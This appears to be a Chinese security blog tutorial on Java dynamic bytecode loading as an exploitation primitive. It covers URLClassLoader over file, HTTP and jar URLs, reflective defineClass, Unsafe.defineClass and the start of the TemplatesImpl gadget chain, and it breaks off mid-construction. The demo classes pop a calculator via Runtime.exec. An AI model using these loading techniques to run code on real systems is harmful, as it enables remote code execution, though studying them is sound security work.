+<h1 id="动态加载字节码的利用方式"><a href="#动态加载字节码的利用方式" class="headerlink" title="动态加载字节码的利用方式"></a>动态加载字节码的利用方式</h1><h2 id="1-利用URLClassLoader远程加载class文件"><a href="#1-利用URLClassLoader远程加载class文件" class="headerlink" title="1. 利用URLClassLoader远程加载class文件"></a>1. 利用URLClassLoader远程加载class文件</h2><h3 id="方法一：file协议加载本地-class文件"><a href="#方法一：file协议加载本地-class文件" class="headerlink" title="方法一：file协议加载本地.class文件"></a>方法一：file协议加载本地.class文件</h3><blockquote>
+<p>URL以斜杠 &#x2F; 结尾，且协议名是 <code>file</code> ，则使用 <code>FileLoader</code> 来寻找类，即为在本地文件系统中寻找<code>.class</code>文件</p>
+</blockquote>
+<p>准备个能弹计算器的测试文件<code>Calc.java</code>：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.ClassLoaderDemo;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Calc</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>编译成<code>.class</code>文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">javac Calc.java<br></code></pre></td></tr></table></figure>
+
+<p>然后我将编译好的<code>Calc.class</code>文件复制粘贴到<code>E:\tmp</code>目录下</p>
+<p><img src="/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260125185010159.png" srcset="/img/loading.gif" lazyload alt="image-20260125185010159"></p>
+<p>准备好测试文件后就可以编写<code>URLClassLoader</code>的启动类：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.ClassLoaderDemo.URLClassLoaderDemo;<br><br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.net.URLClassLoader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FileDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">URLClassLoader</span> <span class="hljs-variable">urlClassLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLClassLoader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;file:///E:/tmp/&quot;</span>)&#125;);<br>        Class&lt;?&gt; calc = urlClassLoader.loadClass(<span class="hljs-string">&quot;src.ClassLoaderDemo.Calc&quot;</span>);<br>        calc.newInstance();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260125190059512.png" srcset="/img/loading.gif" lazyload alt="image-20260125190059512"></p>
+<h3 id="方法二：HTTP协议通过URL加载远程类"><a href="#方法二：HTTP协议通过URL加载远程类" class="headerlink" title="方法二：HTTP协议通过URL加载远程类"></a>方法二：HTTP协议通过URL加载远程类</h3><p>在刚才放<code>Calc.class</code>的<code>E:\tmp\</code>目录下起一个 HTTP 服务：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -m http.server 9999<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260125191536273.png" srcset="/img/loading.gif" lazyload alt="image-20260125191536273"></p>
+<p>然后是利用类：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.ClassLoaderDemo.URLClassLoaderDemo;<br><br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.net.URLClassLoader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HTTPDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">URLClassLoader</span> <span class="hljs-variable">urlClassLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLClassLoader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://127.0.0.1:9999/&quot;</span>)&#125;);<br>        Class&lt;?&gt; calc = urlClassLoader.loadClass(<span class="hljs-string">&quot;src.ClassLoaderDemo.Calc&quot;</span>);<br>        calc.newInstance();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260125191914951.png" srcset="/img/loading.gif" lazyload alt="image-20260125191914951"></p>
+<h3 id="方法三：file-jar协议加载本地JAR包中的类"><a href="#方法三：file-jar协议加载本地JAR包中的类" class="headerlink" title="方法三：file+jar协议加载本地JAR包中的类"></a>方法三：file+jar协议加载本地JAR包中的类</h3><p>将之前的<code>Calc.class</code>文件打包为<code>.jar</code>文件（注意是在编译为<code>Calc.class</code>文件的目录下，不是复制后的<code>E:\tmp\</code>目录）：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">jar -cvf Calc.jar Calc.class<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260125192700508.png" srcset="/img/loading.gif" lazyload alt="image-20260125192700508"></p>
+<p>然后将生成的JAR包复制到<code>E:\tmp\</code>目录下</p>
+<p><img src="/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260125192826800.png" srcset="/img/loading.gif" lazyload alt="image-20260125192826800"></p>
+<p>然后是利用类：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.ClassLoaderDemo.URLClassLoaderDemo;<br><br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.net.URLClassLoader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JarDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">URLClassLoader</span> <span class="hljs-variable">urlClassLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLClassLoader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;jar:file:///E:/tmp/Calc.jar!/&quot;</span>)&#125;);<br>        Class&lt;?&gt; calc = urlClassLoader.loadClass(<span class="hljs-string">&quot;src.ClassLoaderDemo.Calc&quot;</span>);<br>        calc.newInstance();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>注意路径后加上<code>!/</code></li>
+</ul>
+<p><img src="/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260125193321320.png" srcset="/img/loading.gif" lazyload alt="image-20260125193321320"></p>
+<h3 id="方法四：HTTP-jar协议加载远程JAR包中的类"><a href="#方法四：HTTP-jar协议加载远程JAR包中的类" class="headerlink" title="方法四：HTTP+jar协议加载远程JAR包中的类"></a>方法四：HTTP+jar协议加载远程JAR包中的类</h3><p>最好用灵活的肯定是这个方法了</p>
+<p>利用类：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.ClassLoaderDemo.URLClassLoaderDemo;<br><br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.net.URLClassLoader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JarDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br><span class="hljs-comment">//        URLClassLoader urlClassLoader = new URLClassLoader(new URL[]&#123;new URL(&quot;jar:file:///E:/tmp/Calc.jar!/&quot;)&#125;);</span><br>        <span class="hljs-type">URLClassLoader</span> <span class="hljs-variable">urlClassLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLClassLoader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;jar:http://127.0.0.1:9999/Calc.jar!/&quot;</span>)&#125;);<br>        Class&lt;?&gt; calc = urlClassLoader.loadClass(<span class="hljs-string">&quot;src.ClassLoaderDemo.Calc&quot;</span>);<br>        calc.newInstance();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260125193548471.png" srcset="/img/loading.gif" lazyload alt="image-20260125193548471"></p>
+<h2 id="2-利用ClassLoader-defineClass直接加载字节码"><a href="#2-利用ClassLoader-defineClass直接加载字节码" class="headerlink" title="2. 利用ClassLoader.defineClass直接加载字节码"></a>2. 利用ClassLoader.defineClass直接加载字节码</h2><p>本地或远程加载 class 或 jar 文件，Java都是经历以下三个方法调用：</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs 1c">ClassLoader<span class="hljs-meta">#loadClass</span><br>ClassLoader<span class="hljs-meta">#findClass</span><br>ClassLoader<span class="hljs-meta">#defineClass</span><br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<ul>
+<li><code>loadClass()</code> ：是从已加载的类、父加载器位置寻找类（即双亲委派机制），在前面没有找到的情况下，调用当前 ClassLoader 的<code>findClass()</code>方法</li>
+<li><code>findClass()</code> ：根据URL指定的方式来加载类的字节码，其中会调用<code>defineClass()</code></li>
+<li><code>defineClass</code> ：是处理前面传入的字节码，将其处理成真正的 Java 类</li>
+</ul>
+</blockquote>
+<p>最核心的就是<code>defineClass</code>，决定了如何将一段字节流转变成一个Java类</p>
+<p>跟进看看<code>defineClass</code></p>
+<p><img src="/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260125200327390.png" srcset="/img/loading.gif" lazyload alt="image-20260125200327390"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> Class&lt;?&gt; defineClass(String name, <span class="hljs-type">byte</span>[] b, <span class="hljs-type">int</span> off, <span class="hljs-type">int</span> len,<br>                                     ProtectionDomain protectionDomain)<br>    <span class="hljs-keyword">throws</span> ClassFormatError<br>&#123;<br>    protectionDomain = preDefineClass(name, protectionDomain);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">source</span> <span class="hljs-operator">=</span> defineClassSourceLocation(protectionDomain);<br>    Class&lt;?&gt; c = defineClass1(name, b, off, len, protectionDomain, source);<br>    postDefineClass(c, protectionDomain);<br>    <span class="hljs-keyword">return</span> c;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>解释下几个参数：</p>
+<ul>
+<li><code>name</code>：类名</li>
+<li><code>b</code>：字节码数组</li>
+<li><code>off</code>：偏移量</li>
+<li><code>len</code>：字节码数组长度</li>
+</ul>
+<p>可以看到<code>ClassLoader#defineClass</code>是<code>protected</code>属性，所以无法从外部直接访问，因此要反射调用<code>defineClass()</code>进行字节码加载，利用类：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.ClassLoaderDemo.ClassLoaderDefineClassDemo;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ClassLoaderDefineClassDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> ClassLoader.getSystemClassLoader();<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>,String.class,<span class="hljs-type">byte</span>[].class,<span class="hljs-type">int</span>.class,<span class="hljs-type">int</span>.class);<br>        method.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E:/tmp/Calc.class&quot;</span>));<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> (Class) method.invoke(classLoader,<span class="hljs-string">&quot;src.ClassLoaderDemo.Calc&quot;</span>,code,<span class="hljs-number">0</span>,code.length);<br>        c.newInstance();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260125203211746.png" srcset="/img/loading.gif" lazyload alt="image-20260125203211746"></p>
+<ul>
+<li>优点：不要出网就能加载字节码</li>
+<li>缺点：需要设置<code>method.setAccessible(true);</code>，在平常反射中是无法调用的，而且在实际场景中<code>defineClass</code> 方法作用域是不开放的，所以很少能直接利用到</li>
+</ul>
+<h2 id="3-Unsafe-defineClass加载字节码"><a href="#3-Unsafe-defineClass加载字节码" class="headerlink" title="3. Unsafe.defineClass加载字节码"></a>3. Unsafe.defineClass加载字节码</h2><p>在<code>Unsafe</code>中也有<code>defineClass</code>，本质上也是<code>defineClass</code>加载字节码</p>
+<p><img src="/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260125210320004.png" srcset="/img/loading.gif" lazyload alt="image-20260125210320004"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">native</span> Class&lt;?&gt; defineClass(String name, <span class="hljs-type">byte</span>[] b, <span class="hljs-type">int</span> off, <span class="hljs-type">int</span> len,<br>                                   ClassLoader loader,<br>                                   ProtectionDomain protectionDomain);<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这里的 <code>Unsafe</code> 方法，是采用单例模式进行设计的，所以虽然是 public 方法，但无法直接调用，因为我们用反射来调用它</p>
+</blockquote>
+<p>利用类：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.ClassLoaderDemo.UnSafeDefineClassDemo;<br><br><span class="hljs-keyword">import</span> sun.misc.Unsafe;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.security.ProtectionDomain;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UnsafeDefineClassDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span>  Exception&#123;<br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> ClassLoader.getSystemClassLoader();<br>        Class&lt;Unsafe&gt; unsafeClass = Unsafe.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">unsafeField</span> <span class="hljs-operator">=</span> unsafeClass.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>        unsafeField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Unsafe</span> <span class="hljs-variable">classUnsafe</span> <span class="hljs-operator">=</span> (Unsafe) unsafeField.get(<span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">defineClassMethod</span> <span class="hljs-operator">=</span> unsafeClass.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, String.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class, ClassLoader.class, ProtectionDomain.class);<br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E:/tmp/Calc.class&quot;</span>));<br>        Class&lt;?&gt; calc = (Class&lt;?&gt;) defineClassMethod.invoke(classUnsafe,<span class="hljs-string">&quot;src.ClassLoaderDemo.Calc&quot;</span>,code,<span class="hljs-number">0</span>,code.length,classLoader,<span class="hljs-literal">null</span>);<br>        calc.newInstance();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<h2 id="4-TemplatesImpl加载字节码"><a href="#4-TemplatesImpl加载字节码" class="headerlink" title="4. TemplatesImpl加载字节码"></a>4. TemplatesImpl加载字节码</h2><p>跟进看<code>TemplatesImpl</code>类</p>
+<p><img src="/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260126103943854.png" srcset="/img/loading.gif" lazyload alt="image-20260126103943854"></p>
+<p>会看到在<code>TemplatesImpl</code>这个类中还有一个内部类<code>TransletClassLoader</code>，这个类继承了<code>ClassLoader</code>，并且重写了<code>defineClass</code>方法</p>
+<p><img src="/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260126104012668.png" srcset="/img/loading.gif" lazyload alt="image-20260126104012668"></p>
+<blockquote>
+<ul>
+<li>简单来说，这里的 <code>defineClass</code> 由其父类的 protected 类型变成了一个 default 类型的方法，可以被类外部调用</li>
+</ul>
+</blockquote>
+<p>然后向前找一下利用链</p>
+<p>在<code>TemplatesImpl#defineTransletClasses()</code>中会调用到<code>defineClass</code></p>
+<p><img src="/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260126115034635.png" srcset="/img/loading.gif" lazyload alt="image-20260126115034635"></p>
+<p>然后是有三处会调用到<code>defineTransletClasses()</code>，这里用<code>TemplatesImpl#getTransletInstance()</code>，如果<code>_class==null</code>就会调用</p>
+<p><img src="/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260126115331178.png" srcset="/img/loading.gif" lazyload alt="image-20260126115331178"></p>
+<p>然后是在<code>TemplatesImpl#newTransformer()</code>中可以调用到<code>getTransletInstance()</code>，并且<code>newTransformer</code>还是个<code>public</code>，是可以外部调用的</p>
+<p><img src="/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260126115452157.png" srcset="/img/loading.gif" lazyload alt="image-20260126115452157"></p>
+<p>然后在<code>TemplatesImpl#getOutputProperties</code>中可以调用到<code>newTransformer()</code>，这也是个<code>public</code>的，可以外部调用</p>
+<p><img src="/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260126115553591.png" srcset="/img/loading.gif" lazyload alt="image-20260126115553591"></p>
+<p>所以调用链为：</p>
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs livescript">	TemplatesImpl.getOutputProperties<span class="hljs-function"><span class="hljs-params">()</span></span><br><span class="hljs-function">-&gt;</span>	TemplatesImpl.newTransformer<span class="hljs-function"><span class="hljs-params">()</span></span><br><span class="hljs-function">-&gt;</span>	TemplatesImpl.getTransletInstance<span class="hljs-function"><span class="hljs-params">()</span></span><br><span class="hljs-function">-&gt;</span>	TemplatesImpl.defineTransletClasses<span class="hljs-function"><span class="hljs-params">()</span></span><br><span class="hljs-function">-&gt;</span>	TransletClassLoader.defineClass()<br></code></pre></td></tr></table></figure>
+
+<p><code>TemplatesImpl#newTransformer()</code>是<code>public</code>属性，所以可以直接从这里调用开始构造</p>
+<p>先构造字节码</p>
+<blockquote>
+<p>注意，这里的字节码必须继承<code>AbstractTranslet</code>，因为继承了这一抽象类，所以必须要重写一下里面的方法</p>
+</blockquote>
+<p><img src="/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260126142140155.png" srcset="/img/loading.gif" lazyload alt="image-20260126142140155"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.ClassLoaderDemo.TemplatesImplDemo;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TemplatesBytes</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;&#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;&#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">TemplatesBytes</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException&#123;<br>        <span class="hljs-built_in">super</span>();<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>将其进行编译为 class 文件，然后放到<code>E:\tmp\</code>目录下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">javac TemplatesBytes.java<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/01/26/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20260126143138235.png" srcset="/img/loading.gif" lazyload alt="image-20260126143138235"></p>
+<p>然后是这个链子：</p>
+<p>先创建好用来反射设置字段的函数：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>    field.setAccessible(<span class="hljs-literal">true</span>);<br>    field.set(obj, value);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>然后是<code>main</code>函数，先是加载刚才构造的恶意字节码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E:\\JavaClass\\TemplatesBytes.class&quot;</span>));<br></code></pre></td></tr></table></figure>
+
+<p>然后是创建个<code>TemplatesImpl</code>对象实例，通过反射来设置私有字段：</p>
